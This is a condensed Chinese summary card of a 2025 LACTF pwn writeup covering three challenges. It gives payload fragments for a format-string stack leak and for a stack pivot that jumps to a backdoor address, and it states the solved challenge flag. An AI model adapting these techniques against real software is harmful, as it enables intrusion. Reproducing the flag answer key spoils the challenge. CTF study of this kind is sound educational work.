---
title: "2025 LACTF writeup by Min-Venom（2password 格式化串+state-change+minceraft）"
category: pwn
tags: ["2025 LACTF", "pwn", "LACTF 2password %i$p 格式化串泄栈", "hunter2_cfc0xz68 flag", "state-change 0xF1EEEE2D 校验常量", "read=0x4012C1 通用 read"]
signals: ["2025 LACTF 2025", "LACTF 2password %i$p 格式化串泄栈", "hunter2_cfc0xz68 flag", "state-change 0xF1EEEE2D 校验常量", "read=0x4012C1 通用 read", "door=0x4011D6 后门", "0x404540+0x20-1 栈迁移", "minceraft 看我世界 游戏化菜单", "AE64 shellcode 编码", "pwn_unknown", "fmt_string", "heap_exploit", "LACTF", "pwn"]
difficulty: medium
source: "https://www.ctfiot.com/227551.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2025 LACTF writeup by Min-Venom（2password 格式化串+state-change+minceraft）

> 赛事：2025 LACTF 2025 | 方向：pwn | 难度：medium

## 一句话总结

2025 LACTF 三 pwn：2password 格式化串泄栈 + state-change read 栈迁移到 0xF1EEEE2D 后门 + minceraft 看我世界游戏菜单。

## 攻击链

1. 2password: sendline(f"%{i}$p") for i in [6,9) 泄栈 → 小端序 hex → flag
2. flag: lactf{hunter2_cfc0xz68}
3. state-change: payload=b''a''*0x20+p64(0x404540+0x20-1)+p64(read) 栈迁移
4. 二次 pay=p32(0xF1EEEE2D)*9+b'a'*3+p64(door) 触发后门
5. minceraft 看我世界: pwn 菜单逆向

## 关键 payload

```
p.sendline(f'%{i}$p') for i in range(6, 9)
```

## 经验教训

格式化串 `%N$p` 泄栈 + 小端序 hex 转 flag 是入门 pwn 第一招；栈迁移要算准 `target_addr - 1` 让 rbp 写入后 leave 触发跳。

## 标签

LACTF 2password %i$p 格式化串泄栈、hunter2_cfc0xz68 flag、state-change 0xF1EEEE2D 校验常量、read=0x4012C1 通用 read、door=0x4011D6 后门、0x404540+0x20-1 栈迁移、minceraft 看我世界 游戏化菜单、AE64 shellcode 编码

## 参考来源

- https://www.ctfiot.com/227551.html
- 原文件：2025LACTF_writeup_by_Min-Venom.full.md
